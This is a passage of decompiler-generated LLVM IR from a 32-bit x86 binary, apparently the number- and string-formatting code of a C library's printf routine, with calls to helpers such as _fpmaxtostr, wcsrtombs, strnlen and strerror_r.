dec_label_pc_804e365:                             ; preds = %dec_label_pc_804e361
  %v1_804e365 = inttoptr i32 %v0_804e375 to i8*
  %v2_804e365 = load i8, i8* %v1_804e365, align 1
  %v3_804e365 = add i8 %v2_804e365, -48
  %v8_804e365 = icmp eq i8 %v3_804e365, 0
  %v9_804e365 = icmp slt i8 %v3_804e365, 0
  store i1 %v9_804e365, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_804e365, label %dec_label_pc_804e375, label %dec_label_pc_804e36f

dec_label_pc_804e36f:                             ; preds = %dec_label_pc_804e365
  %v1_804e36f = add i32 %v2_804e333, 128
  store i32 %v1_804e36f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e375

dec_label_pc_804e375:                             ; preds = %dec_label_pc_804e361, %dec_label_pc_804e365, %dec_label_pc_804e35c, %dec_label_pc_804e323, %dec_label_pc_804e355, %dec_label_pc_804e36f
  %v0_804e3ae = phi i32 [ %v3_804e33a, %dec_label_pc_804e361 ], [ 1, %dec_label_pc_804e365 ], [ %v3_804e33a, %dec_label_pc_804e35c ], [ %v3_804e33a, %dec_label_pc_804e323 ], [ %v3_804e33a, %dec_label_pc_804e355 ], [ %v1_804e36f, %dec_label_pc_804e36f ]
  %v1_804e375 = inttoptr i32 %v0_804e375 to i8*
  %v2_804e375 = load i8, i8* %v1_804e375, align 1
  %v3_804e375 = add i8 %v2_804e375, -48
  %v8_804e375 = icmp eq i8 %v3_804e375, 0
  %v9_804e375 = icmp slt i8 %v3_804e375, 0
  store i1 %v9_804e375, i1* %sf.global-to-local, align 1
  %v1_804e378 = icmp eq i1 %v8_804e375, false
  br i1 %v1_804e378, label %dec_label_pc_804e3a6, label %dec_label_pc_804e37a

dec_label_pc_804e37a:                             ; preds = %dec_label_pc_804e375
  %v0_804e37a = load i32, i32* @ebp, align 4
  %v1_804e37a = add i32 %v0_804e37a, -6
  %v6_804e37a = sub i32 5, %v0_804e37a
  %v7_804e37a = and i32 %v6_804e37a, %v0_804e37a
  %v8_804e37a = icmp slt i32 %v7_804e37a, 0
  %v10_804e37a = icmp slt i32 %v1_804e37a, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_804e382 = icmp eq i1 %v10_804e37a, %v8_804e37a
  %v5_804e382 = select i1 %v2_804e382, i32 11, i32 %v0_804e37a
  store i32 %v5_804e382, i32* @ebp, align 4
  %v1_804e385 = add i32 %v0_804e385, 48
  %v2_804e385 = inttoptr i32 %v1_804e385 to i32*
  %v3_804e385 = load i32, i32* %v2_804e385, align 4
  %v4_804e385 = add i32 %v3_804e385, -1
  %v12_804e385 = icmp eq i32 %v4_804e385, 0
  %v13_804e385 = icmp slt i32 %v4_804e385, 0
  store i1 %v13_804e385, i1* %sf.global-to-local, align 1
  %v1_804e38a = icmp eq i1 %v12_804e385, false
  br i1 %v1_804e38a, label %dec_label_pc_804e39b, label %dec_label_pc_804e38c

dec_label_pc_804e38c:                             ; preds = %dec_label_pc_804e37a
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8050ba0.114 to i32), i32* @edi, align 4
  br label %dec_label_pc_804e525

dec_label_pc_804e39b:                             ; preds = %dec_label_pc_804e37a
  %v1_804e39b = icmp eq i32 %v0_804e3ae, 0
  %v2_804e39b = icmp slt i32 %v0_804e3ae, 0
  store i1 %v2_804e39b, i1* %sf.global-to-local, align 1
  %v1_804e39d = icmp eq i1 %v1_804e39b, false
  br i1 %v1_804e39d, label %dec_label_pc_804e3a6, label %dec_label_pc_804e39f

dec_label_pc_804e39f:                             ; preds = %dec_label_pc_804e39b
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e525

dec_label_pc_804e3a6:                             ; preds = %dec_label_pc_804e39b, %dec_label_pc_804e375
  %v2_804e3a6 = sub i32 %v0_804e3ae, %v1_804e335
  %v7_804e3a6 = icmp ult i32 %v0_804e3ae, %v1_804e335
  %v12_804e3a6 = icmp eq i32 %v2_804e3a6, 0
  %v13_804e3a6 = icmp slt i32 %v2_804e3a6, 0
  store i1 %v13_804e3a6, i1* %sf.global-to-local, align 1
  %v2_804e3a8 = or i1 %v7_804e3a6, %v12_804e3a6
  br i1 %v2_804e3a8, label %dec_label_pc_804e525, label %dec_label_pc_804e3ae

dec_label_pc_804e3ae:                             ; preds = %dec_label_pc_804e3a6
  store i1 %v13_804e3a6, i1* %sf.global-to-local, align 1
  store i32 %v2_804e3a6, i32* @ebx, align 4
  br label %dec_label_pc_804e53f

dec_label_pc_804e3b7:                             ; preds = %dec_label_pc_804e24a
  %v1_804e3b7 = add i32 %v3_804e21c, -15
  %v5_804e3b7 = icmp ult i32 %v3_804e21c, 15
  %v9_804e3b7 = icmp eq i32 %v1_804e3b7, 0
  %v10_804e3b7 = icmp slt i32 %v1_804e3b7, 0
  store i1 %v10_804e3b7, i1* %sf.global-to-local, align 1
  %v2_804e3ba = or i1 %v5_804e3b7, %v9_804e3b7
  br i1 %v2_804e3ba, label %dec_label_pc_804e3bc, label %dec_label_pc_804e401

dec_label_pc_804e3bc:                             ; preds = %dec_label_pc_804e3b7
  %v1_804e3bc = add i32 %v0_804e21c.lcssa, 33
  %v2_804e3bc = inttoptr i32 %v1_804e3bc to i8*
  %v3_804e3bc = load i8, i8* %v2_804e3bc, align 1
  %v4_804e3bc = and i8 %v3_804e3bc, 8
  %v5_804e3bc = icmp eq i8 %v4_804e3bc, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804e3c1 = add i32 %v0_804e21c.lcssa, 344
  %v2_804e3c1 = inttoptr i32 %v1_804e3c1 to i32*
  %v3_804e3c1 = load i32, i32* %v2_804e3c1, align 4
  store i32 %v3_804e3c1, i32* %edx.global-to-local, align 4
  br i1 %v5_804e3bc, label %dec_label_pc_804e3ce, label %dec_label_pc_804e3ca

dec_label_pc_804e3ca:                             ; preds = %dec_label_pc_804e3bc
  %v1_804e3ca = inttoptr i32 %v3_804e3c1 to x86_fp80*
  %v2_804e3ca = load x86_fp80, x86_fp80* %v1_804e3ca, align 4
  br label %dec_label_pc_804e3d0

dec_label_pc_804e3ce:                             ; preds = %dec_label_pc_804e3bc
  %v1_804e3ce = inttoptr i32 %v3_804e3c1 to double*
  %v2_804e3ce = load double, double* %v1_804e3ce, align 4
  %v3_804e3ce = fpext double %v2_804e3ce to x86_fp80
  br label %dec_label_pc_804e3d0

dec_label_pc_804e3d0:                             ; preds = %dec_label_pc_804e3ca, %dec_label_pc_804e3ce
  %storemerge4 = phi x86_fp80 [ %v2_804e3ca, %dec_label_pc_804e3ca ], [ %v3_804e3ce, %dec_label_pc_804e3ce ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_804e3d0 = load i32, i32* @esi, align 4
  %v2_804e3d0 = add i32 %v0_804e21c.lcssa, -4
  %v3_804e3d0 = inttoptr i32 %v2_804e3d0 to i32*
  store i32 %v0_804e3d0, i32* %v3_804e3d0, align 4
  %v0_804e3d1 = load i32, i32* @esi, align 4
  %v2_804e3d1 = add i32 %v0_804e21c.lcssa, -8
  %v3_804e3d1 = inttoptr i32 %v2_804e3d1 to i32*
  store i32 %v0_804e3d1, i32* %v3_804e3d1, align 4
  %v1_804e3d2 = add i32 %v0_804e21c.lcssa, -12
  %v2_804e3d2 = inttoptr i32 %v1_804e3d2 to i32*
  store i32 134537362, i32* %v2_804e3d2, align 4
  %v1_804e3d7 = add i32 %v0_804e21c.lcssa, 20
  store i32 %v1_804e3d7, i32* %eax.global-to-local, align 4
  %v2_804e3db = add i32 %v0_804e21c.lcssa, -16
  %v3_804e3db = inttoptr i32 %v2_804e3db to i32*
  store i32 %v1_804e3d7, i32* %v3_804e3db, align 4
  %v1_804e3dc = add i32 %v0_804e21c.lcssa, -28
  %v10_804e3dc = icmp slt i32 %v1_804e3dc, 0
  store i1 %v10_804e3dc, i1* %sf.global-to-local, align 1
  %v1_804e3df = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804e3df = inttoptr i32 %v1_804e3dc to x86_fp80*
  store x86_fp80 %v1_804e3df, x86_fp80* %v3_804e3df, align 4
  %v1_804e3e2 = add i32 %v0_804e21c.lcssa, 368
  %v2_804e3e2 = inttoptr i32 %v1_804e3e2 to i32*
  %v3_804e3e2 = load i32, i32* %v2_804e3e2, align 4
  %v5_804e3e2 = add i32 %v0_804e21c.lcssa, -32
  %v6_804e3e2 = inttoptr i32 %v5_804e3e2 to i32*
  store i32 %v3_804e3e2, i32* %v6_804e3e2, align 4
  %v0_804e3e9 = call i32 @_fpmaxtostr()
  store i32 %v0_804e3e9, i32* %eax.global-to-local, align 4
  %v0_804e3ee = load i32, i32* @esp, align 4
  %v1_804e3ee = add i32 %v0_804e3ee, 32
  %v2_804e3f1 = icmp slt i32 %v0_804e3e9, 0
  store i1 %v2_804e3f1, i1* %sf.global-to-local, align 1
  br i1 %v2_804e3f1, label %dec_label_pc_804e69f, label %dec_label_pc_804e3f9

dec_label_pc_804e3f9:                             ; preds = %dec_label_pc_804e3d0
  %v1_804e3f9 = inttoptr i32 %v1_804e3ee to i32*
  %v2_804e3f9 = load i32, i32* %v1_804e3f9, align 4
  %v4_804e3f9 = add i32 %v2_804e3f9, %v0_804e3e9
  %v15_804e3f9 = icmp slt i32 %v4_804e3f9, 0
  store i1 %v15_804e3f9, i1* %sf.global-to-local, align 1
  store i32 %v4_804e3f9, i32* %v1_804e3f9, align 4
  %v0_804e68c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e68c

dec_label_pc_804e401:                             ; preds = %dec_label_pc_804e3b7
  %v1_804e401 = add i32 %v3_804e21c, -17
  %v5_804e401 = icmp ult i32 %v3_804e21c, 17
  %v9_804e401 = icmp eq i32 %v1_804e401, 0
  %v10_804e401 = icmp slt i32 %v1_804e401, 0
  store i1 %v10_804e401, i1* %sf.global-to-local, align 1
  %v2_804e404 = or i1 %v5_804e401, %v9_804e401
  br i1 %v2_804e404, label %dec_label_pc_804e40a, label %dec_label_pc_804e49e

dec_label_pc_804e40a:                             ; preds = %dec_label_pc_804e401
  %v1_804e40a = add i32 %v0_804e21c.lcssa, 332
  %v2_804e40a = inttoptr i32 %v1_804e40a to i32*
  store i32 0, i32* %v2_804e40a, align 4
  %v0_804e415 = load i32, i32* @esp, align 4
  %v1_804e415 = add i32 %v0_804e415, 344
  %v2_804e415 = inttoptr i32 %v1_804e415 to i32*
  %v3_804e415 = load i32, i32* %v2_804e415, align 4
  store i32 %v3_804e415, i32* %edx.global-to-local, align 4
  %v1_804e41c = icmp eq i1 %v9_804e401, false
  br i1 %v1_804e41c, label %dec_label_pc_804e46e, label %dec_label_pc_804e41e

dec_label_pc_804e41e:                             ; preds = %dec_label_pc_804e40a
  %v1_804e41e = inttoptr i32 %v3_804e415 to i32*
  %v2_804e41e = load i32, i32* %v1_804e41e, align 4
  store i32 %v2_804e41e, i32* %eax.global-to-local, align 4
  %v1_804e420 = icmp eq i32 %v2_804e41e, 0
  %v2_804e420 = icmp slt i32 %v2_804e41e, 0
  store i1 %v2_804e420, i1* %sf.global-to-local, align 1
  %v2_804e422 = add i32 %v0_804e415, 340
  %v3_804e422 = inttoptr i32 %v2_804e422 to i32*
  store i32 %v2_804e41e, i32* %v3_804e422, align 4
  br i1 %v1_804e420, label %dec_label_pc_804e529, label %dec_label_pc_804e42f

dec_label_pc_804e42f:                             ; preds = %dec_label_pc_804e41e
  %v0_804e42f = load i32, i32* @esp, align 4
  %v1_804e42f = add i32 %v0_804e42f, 20
  %v2_804e42f = inttoptr i32 %v1_804e42f to i32*
  %v3_804e42f = load i32, i32* %v2_804e42f, align 4
  %v1_804e436 = add i32 %v0_804e42f, 340
  store i32 %v1_804e436, i32* %ecx.global-to-local, align 4
  %v2_804e43d = icmp slt i32 %v3_804e42f, 0
  store i1 %v2_804e43d, i1* %sf.global-to-local, align 1
  %v1_804e43f = icmp eq i1 %v2_804e43d, false
  %v4_804e43f = select i1 %v1_804e43f, i32 %v3_804e42f, i32 -1
  store i32 %v4_804e43f, i32* %edx.global-to-local, align 4
  %v1_804e442 = add i32 %v0_804e42f, 332
  store i32 %v1_804e442, i32* %eax.global-to-local, align 4
  %v2_804e449 = add i32 %v0_804e42f, -4
  %v3_804e449 = inttoptr i32 %v2_804e449 to i32*
  store i32 %v1_804e442, i32* %v3_804e449, align 4
  %v0_804e44a = load i32, i32* %edx.global-to-local, align 4
  %v2_804e44a = add i32 %v0_804e42f, -8
  %v3_804e44a = inttoptr i32 %v2_804e44a to i32*
  store i32 %v0_804e44a, i32* %v3_804e44a, align 4
  %v0_804e44b = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e44b = add i32 %v0_804e42f, -12
  %v3_804e44b = inttoptr i32 %v2_804e44b to i32*
  store i32 %v0_804e44b, i32* %v3_804e44b, align 4
  %v0_804e44c = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e44c = add i32 %v0_804e42f, -16
  %v3_804e44c = inttoptr i32 %v2_804e44c to i32*
  store i32 %v0_804e44c, i32* %v3_804e44c, align 4
  %v0_804e44d = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e44d, i32* %eax.global-to-local, align 4
  %v0_804e452 = load i32, i32* @esp, align 4
  %v1_804e452 = add i32 %v0_804e452, 16
  %v1_804e455 = add i32 %v0_804e44d, 1
  %v10_804e455 = icmp eq i32 %v1_804e455, 0
  %v11_804e455 = icmp slt i32 %v1_804e455, 0
  store i1 %v11_804e455, i1* %sf.global-to-local, align 1
  store i32 %v0_804e44d, i32* @esi, align 4
  br i1 %v10_804e455, label %dec_label_pc_804e69f, label %dec_label_pc_804e460

dec_label_pc_804e460:                             ; preds = %dec_label_pc_804e42f
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804e53a

dec_label_pc_804e46e:                             ; preds = %dec_label_pc_804e40a
  %v0_804e46e = load i32, i32* @ebx, align 4
  %v2_804e46e = add i32 %v0_804e415, -4
  %v3_804e46e = inttoptr i32 %v2_804e46e to i32*
  store i32 %v0_804e46e, i32* %v3_804e46e, align 4
  %v1_804e46f = add i32 %v0_804e415, 332
  store i32 %v1_804e46f, i32* %eax.global-to-local, align 4
  %v2_804e476 = add i32 %v0_804e415, -8
  %v3_804e476 = inttoptr i32 %v2_804e476 to i32*
  store i32 %v1_804e46f, i32* %v3_804e476, align 4
  %v0_804e477 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e477 = inttoptr i32 %v0_804e477 to i32*
  %v2_804e477 = load i32, i32* %v1_804e477, align 4
  %v4_804e477 = add i32 %v0_804e415, -12
  %v5_804e477 = inttoptr i32 %v4_804e477 to i32*
  store i32 %v2_804e477, i32* %v5_804e477, align 4
  %v1_804e479 = add i32 %v0_804e415, 204
  store i32 %v1_804e479, i32* @edi, align 4
  %v2_804e480 = add i32 %v0_804e415, -16
  %v3_804e480 = inttoptr i32 %v2_804e480 to i32*
  store i32 %v1_804e479, i32* %v3_804e480, align 4
  %v0_804e481 = call i32 @__GI_wcrtomb()
  store i32 %v0_804e481, i32* %eax.global-to-local, align 4
  %v0_804e486 = load i32, i32* @esp, align 4
  %v1_804e486 = add i32 %v0_804e486, 16
  %v1_804e489 = add i32 %v0_804e481, 1
  %v10_804e489 = icmp eq i32 %v1_804e489, 0
  %v11_804e489 = icmp slt i32 %v1_804e489, 0
  store i1 %v11_804e489, i1* %sf.global-to-local, align 1
  store i32 %v0_804e481, i32* @esi, align 4
  br i1 %v10_804e489, label %dec_label_pc_804e69f, label %dec_label_pc_804e494

dec_label_pc_804e494:                             ; preds = %dec_label_pc_804e46e
  %v2_804e494 = add i32 %v0_804e481, 220
  %v3_804e494 = add i32 %v2_804e494, %v0_804e486
  %v4_804e494 = inttoptr i32 %v3_804e494 to i8*
  store i8 0, i8* %v4_804e494, align 1
  br label %dec_label_pc_804e4cc

dec_label_pc_804e49e:                             ; preds = %dec_label_pc_804e401
  %v1_804e49e = add i32 %v3_804e21c, -19
  %v5_804e49e = icmp ult i32 %v3_804e21c, 19
  %v9_804e49e = icmp eq i32 %v1_804e49e, 0
  %v10_804e49e = icmp slt i32 %v1_804e49e, 0
  store i1 %v10_804e49e, i1* %sf.global-to-local, align 1
  %v2_804e4a1 = or i1 %v5_804e49e, %v9_804e49e
  br i1 %v2_804e4a1, label %dec_label_pc_804e4a3, label %dec_label_pc_804e4fb

dec_label_pc_804e4a3:                             ; preds = %dec_label_pc_804e49e
  %v1_804e4a3 = add i32 %v0_804e21c.lcssa, 344
  %v2_804e4a3 = inttoptr i32 %v1_804e4a3 to i32*
  %v3_804e4a3 = load i32, i32* %v2_804e4a3, align 4
  store i32 %v3_804e4a3, i32* %edx.global-to-local, align 4
  %v1_804e4aa = icmp eq i1 %v9_804e49e, false
  %v1_804e4d5 = inttoptr i32 %v3_804e4a3 to i32*
  %v2_804e4d5 = load i32, i32* %v1_804e4d5, align 4
  br i1 %v1_804e4aa, label %dec_label_pc_804e4d5, label %dec_label_pc_804e4ac

dec_label_pc_804e4ac:                             ; preds = %dec_label_pc_804e4a3
  store i32 %v2_804e4d5, i32* @edi, align 4
  %v1_804e4ae = icmp eq i32 %v2_804e4d5, 0
  %v2_804e4ae = icmp slt i32 %v2_804e4d5, 0
  store i1 %v2_804e4ae, i1* %sf.global-to-local, align 1
  br i1 %v1_804e4ae, label %dec_label_pc_804e529, label %dec_label_pc_804e4b2

dec_label_pc_804e4b2:                             ; preds = %dec_label_pc_804e4ac, %dec_label_pc_804e504
  %v1_804e4b9 = phi i32 [ %v0_804e21c.lcssa, %dec_label_pc_804e4ac ], [ %v1_804e51e, %dec_label_pc_804e504 ]
  %v1_804e4b2 = add i32 %v1_804e4b9, 20
  %v2_804e4b2 = inttoptr i32 %v1_804e4b2 to i32*
  %v3_804e4b2 = load i32, i32* %v2_804e4b2, align 4
  store i32 %v3_804e4b2, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_804e4b9 = add i32 %v1_804e4b9, -4
  %v3_804e4b9 = inttoptr i32 %v2_804e4b9 to i32*
  store i32 %v3_804e21c, i32* %v3_804e4b9, align 4
  %v2_804e4ba = add i32 %v1_804e4b9, -8
  %v3_804e4ba = inttoptr i32 %v2_804e4ba to i32*
  store i32 %v3_804e21c, i32* %v3_804e4ba, align 4
  %v2_804e4bb = icmp slt i32 %v3_804e4b2, 0
  store i1 %v2_804e4bb, i1* %sf.global-to-local, align 1
  %v1_804e4bd = icmp eq i1 %v2_804e4bb, false
  %v2_804e4bd = load i32, i32* %eax.global-to-local, align 4
  %v4_804e4bd = select i1 %v1_804e4bd, i32 %v3_804e4b2, i32 %v2_804e4bd
  store i32 %v4_804e4bd, i32* %eax.global-to-local, align 4
  %v2_804e4c0 = add i32 %v1_804e4b9, -12
  %v3_804e4c0 = inttoptr i32 %v2_804e4c0 to i32*
  store i32 %v4_804e4bd, i32* %v3_804e4c0, align 4
  %v0_804e4c1 = load i32, i32* @edi, align 4
  %v2_804e4c1 = add i32 %v1_804e4b9, -16
  %v3_804e4c1 = inttoptr i32 %v2_804e4c1 to i32*
  store i32 %v0_804e4c1, i32* %v3_804e4c1, align 4
  %v0_804e4c2 = call i32 @strnlen()
  store i32 %v0_804e4c2, i32* %eax.global-to-local, align 4
  %v0_804e4c7 = load i32, i32* @esp, align 4
  %v1_804e4c7 = add i32 %v0_804e4c7, 16
  %v7_804e4c7 = icmp slt i32 %v1_804e4c7, 0
  store i1 %v7_804e4c7, i1* %sf.global-to-local, align 1
  store i32 %v0_804e4c2, i32* @esi, align 4
  br label %dec_label_pc_804e4cc

dec_label_pc_804e4cc:                             ; preds = %dec_label_pc_804e494, %dec_label_pc_804e4b2
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804e53a

dec_label_pc_804e4d5:                             ; preds = %dec_label_pc_804e4a3
  store i32 %v2_804e4d5, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_804e4e3 = add i32 %v0_804e21c.lcssa, 204
  store i32 %v1_804e4e3, i32* @edi, align 4
  %v1_804e4ea = add i32 %v0_804e21c.lcssa, 205
  %v2_804e4ea = inttoptr i32 %v1_804e4ea to i8*
  store i8 0, i8* %v2_804e4ea, align 1
  %v0_804e4f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e4f2 = trunc i32 %v0_804e4f2 to i8
  %v2_804e4f2 = load i32, i32* @esp, align 4
  %v3_804e4f2 = add i32 %v2_804e4f2, 204
  %v4_804e4f2 = inttoptr i32 %v3_804e4f2 to i8*
  store i8 %v1_804e4f2, i8* %v4_804e4f2, align 1
  br label %dec_label_pc_804e53a

dec_label_pc_804e4fb:                             ; preds = %dec_label_pc_804e49e
  %v1_804e4fb = add i32 %v3_804e21c, -20
  %v9_804e4fb = icmp eq i32 %v1_804e4fb, 0
  %v10_804e4fb = icmp slt i32 %v1_804e4fb, 0
  store i1 %v10_804e4fb, i1* %sf.global-to-local, align 1
  %v1_804e4fe = icmp eq i1 %v9_804e4fb, false
  br i1 %v1_804e4fe, label %dec_label_pc_804e69f, label %dec_label_pc_804e504

dec_label_pc_804e504:                             ; preds = %dec_label_pc_804e4fb
  %v0_804e504 = load i32, i32* %stack_var_-364, align 4
  %v1_804e504 = call i32 @__errno_location(i32 %v0_804e504)
  store i32 %v1_804e504, i32* %eax.global-to-local, align 4
  %v0_804e509 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e509 = load i32, i32* @esp, align 4
  %v2_804e509 = add i32 %v1_804e509, -4
  %v3_804e509 = inttoptr i32 %v2_804e509 to i32*
  store i32 %v0_804e509, i32* %v3_804e509, align 4
  %v1_804e50a = add i32 %v1_804e509, -8
  %v2_804e50a = inttoptr i32 %v1_804e50a to i32*
  store i32 128, i32* %v2_804e50a, align 4
  %v1_804e50f = add i32 %v1_804e509, 204
  store i32 %v1_804e50f, i32* %edx.global-to-local, align 4
  %v2_804e516 = add i32 %v1_804e509, -12
  %v3_804e516 = inttoptr i32 %v2_804e516 to i32*
  store i32 %v1_804e50f, i32* %v3_804e516, align 4
  %v1_804e517 = inttoptr i32 %v1_804e504 to i32*
  %v2_804e517 = load i32, i32* %v1_804e517, align 4
  %v4_804e517 = add i32 %v1_804e509, -16
  %v5_804e517 = inttoptr i32 %v4_804e517 to i32*
  store i32 %v2_804e517, i32* %v5_804e517, align 4
  %v0_804e519 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804e519, i32* %eax.global-to-local, align 4
  %v0_804e51e = load i32, i32* @esp, align 4
  %v1_804e51e = add i32 %v0_804e51e, 16
  %v7_804e51e = icmp slt i32 %v1_804e51e, 0
  store i1 %v7_804e51e, i1* %sf.global-to-local, align 1
  store i32 %v0_804e519, i32* @edi, align 4
  br label %dec_label_pc_804e4b2

dec_label_pc_804e525:                             ; preds = %dec_label_pc_804e3a6, %dec_label_pc_804e39f, %dec_label_pc_804e38c
  %v0_804e54234 = phi i32 [ %v1_804e335, %dec_label_pc_804e3a6 ], [ 0, %dec_label_pc_804e39f ], [ 5, %dec_label_pc_804e38c ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e53f

dec_label_pc_804e529:                             ; preds = %dec_label_pc_804e4ac, %dec_label_pc_804e41e
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8050ba6.115 to i32), i32* @edi, align 4
  br label %dec_label_pc_804e53a

dec_label_pc_804e53a:                             ; preds = %dec_label_pc_804e4d5, %dec_label_pc_804e4cc, %dec_label_pc_804e460, %dec_label_pc_804e529
  %v0_804e53a = load i32, i32* @esp, align 4
  %v1_804e53a = add i32 %v0_804e53a, 7
  %v2_804e53a = inttoptr i32 %v1_804e53a to i8*
  store i8 32, i8* %v2_804e53a, align 1
  %v0_804e542.pre = load i32, i32* @esi, align 4
  %v1_804e542.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e53f

dec_label_pc_804e53f:                             ; preds = %dec_label_pc_804e525, %dec_label_pc_804e3ae, %dec_label_pc_804e53a
  %v1_804e542 = phi i32 [ 0, %dec_label_pc_804e525 ], [ %v2_804e3a6, %dec_label_pc_804e3ae ], [ %v1_804e542.pre, %dec_label_pc_804e53a ]
  %v0_804e542 = phi i32 [ %v0_804e54234, %dec_label_pc_804e525 ], [ %v1_804e335, %dec_label_pc_804e3ae ], [ %v0_804e542.pre, %dec_label_pc_804e53a ]
  %v0_804e53f = load i32, i32* @ebp, align 4
  %v1_804e53f = add i32 %v0_804e53f, -11
  %v9_804e53f = icmp eq i32 %v1_804e53f, 0
  %v10_804e53f = icmp slt i32 %v1_804e53f, 0
  store i1 %v10_804e53f, i1* %sf.global-to-local, align 1
  %v2_804e542 = add i32 %v0_804e542, %v1_804e542
  store i32 %v2_804e542, i32* @edx, align 4
  br i1 %v9_804e53f, label %dec_label_pc_804e553, label %dec_label_pc_804e547

dec_label_pc_804e547:                             ; preds = %dec_label_pc_804e53f
  %v1_804e549 = add i32 %v0_804e53f, -5
  %v6_804e549 = sub i32 4, %v0_804e53f
  %v7_804e549 = and i32 %v6_804e549, %v0_804e53f
  %v8_804e549 = icmp slt i32 %v7_804e549, 0
  %v9_804e549 = icmp eq i32 %v1_804e549, 0
  %v10_804e549 = icmp slt i32 %v1_804e549, 0
  store i1 %v10_804e549, i1* %sf.global-to-local, align 1
  %v3_804e54c = icmp eq i1 %v10_804e549, %v8_804e549
  %v4_804e54c = icmp eq i1 %v9_804e549, false
  %v5_804e54c = and i1 %v4_804e54c, %v3_804e54c
  %v6_804e54c = zext i1 %v5_804e54c to i32
  store i32 %v6_804e54c, i32* %eax.global-to-local, align 4
  %v2_804e54f = add i32 %v2_804e542, 1
  %v3_804e54f = add i32 %v2_804e54f, %v6_804e54c
  store i32 %v3_804e54f, i32* @edx, align 4
  br label %dec_label_pc_804e553

dec_label_pc_804e553:                             ; preds = %dec_label_pc_804e53f, %dec_label_pc_804e547
  %v0_804e553 = load i32, i32* @esp, align 4
  %v1_804e553 = add i32 %v0_804e553, 24
  %v2_804e553 = inttoptr i32 %v1_804e553 to i32*
  %v3_804e553 = load i32, i32* %v2_804e553, align 4
  store i32 %v3_804e553, i32* %eax.global-to-local, align 4
  %v1_804e557 = add i32 %v0_804e553, 8
  %v2_804e557 = inttoptr i32 %v1_804e557 to i32*
  store i32 0, i32* %v2_804e557, align 4
  %v0_804e55f = load i32, i32* %eax.global-to-local, align 4
  %v1_804e55f = load i32, i32* @edx, align 4
  %v2_804e55f = sub i32 %v0_804e55f, %v1_804e55f
  %v7_804e55f = icmp ult i32 %v0_804e55f, %v1_804e55f
  %v12_804e55f = icmp eq i32 %v2_804e55f, 0
  %v13_804e55f = icmp slt i32 %v2_804e55f, 0
  store i1 %v13_804e55f, i1* %sf.global-to-local, align 1
  %v2_804e561 = or i1 %v7_804e55f, %v12_804e55f
  br i1 %v2_804e561, label %dec_label_pc_804e569, label %dec_label_pc_804e563

dec_label_pc_804e563:                             ; preds = %dec_label_pc_804e553
  store i1 %v13_804e55f, i1* %sf.global-to-local, align 1
  store i32 %v2_804e55f, i32* %eax.global-to-local, align 4
  %v1_804e565 = load i32, i32* @esp, align 4
  %v2_804e565 = add i32 %v1_804e565, 8
  %v3_804e565 = inttoptr i32 %v2_804e565 to i32*
  store i32 %v2_804e55f, i32* %v3_804e565, align 4
  %v0_804e56d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e569

dec_label_pc_804e569:                             ; preds = %dec_label_pc_804e553, %dec_label_pc_804e563
  %v0_804e56d = phi i32 [ %v1_804e55f, %dec_label_pc_804e553 ], [ %v0_804e56d.pre, %dec_label_pc_804e563 ]
  %v0_804e569 = load i32, i32* @esp, align 4
  %v1_804e569 = add i32 %v0_804e569, 8
  %v2_804e569 = inttoptr i32 %v1_804e569 to i32*
  %v3_804e569 = load i32, i32* %v2_804e569, align 4
  store i32 %v3_804e569, i32* @ecx, align 4
  %v2_804e56d = add i32 %v3_804e569, %v0_804e56d
  store i32 %v2_804e56d, i32* %eax.global-to-local, align 4
  %v1_804e570 = inttoptr i32 %v0_804e569 to i32*
  %v2_804e570 = load i32, i32* %v1_804e570, align 4
  %v4_804e570 = add i32 %v2_804e570, %v2_804e56d
  %v15_804e570 = icmp slt i32 %v4_804e570, 0
  store i1 %v15_804e570, i1* %sf.global-to-local, align 1
  store i32 %v4_804e570, i32* %v1_804e570, align 4
  %v0_804e573 = load i32, i32* @esp, align 4
  %v1_804e573 = add i32 %v0_804e573, 7
  %v2_804e573 = inttoptr i32 %v1_804e573 to i8*
  %v3_804e573 = load i8, i8* %v2_804e573, align 1
  %v4_804e573 = add i8 %v3_804e573, -48
  %v9_804e573 = icmp eq i8 %v4_804e573, 0
  %v10_804e573 = icmp slt i8 %v4_804e573, 0
  store i1 %v10_804e573, i1* %sf.global-to-local, align 1
  %v1_804e578 = icmp eq i1 %v9_804e573, false
  br i1 %v1_804e578, label %dec_label_pc_804e584, label %dec_label_pc_804e57a

dec_label_pc_804e57a:                             ; preds = %dec_label_pc_804e569
  %v0_804e57a = load i32, i32* @ebx, align 4
  %v1_804e57a = load i32, i32* @ecx, align 4
